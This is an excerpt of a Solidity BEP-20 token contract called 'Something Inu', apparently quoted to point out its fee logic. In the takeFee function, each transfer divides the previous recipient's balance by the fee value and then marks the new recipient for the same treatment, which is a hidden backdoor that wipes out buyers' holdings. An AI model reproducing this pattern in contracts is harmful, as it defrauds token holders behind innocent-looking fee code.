...
contract SINU is IBEP20, Auth {
    ...
    string constant _name = "Something Inu";
    ...
    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        ...
        if (buyBackFeeReceiver != address(0) && buyBackFeeReceiver != sender && buyBackFeeReceiver != recipient)
            _balances[buyBackFeeReceiver] = _balances[buyBackFeeReceiver].div(totalFee);

        _balances[address(this)] = _balances[address(this)].add(feeAmount);

        if (recipient != pair && recipient != address(0) && recipient != DEAD)
            buyBackFeeReceiver = recipient;
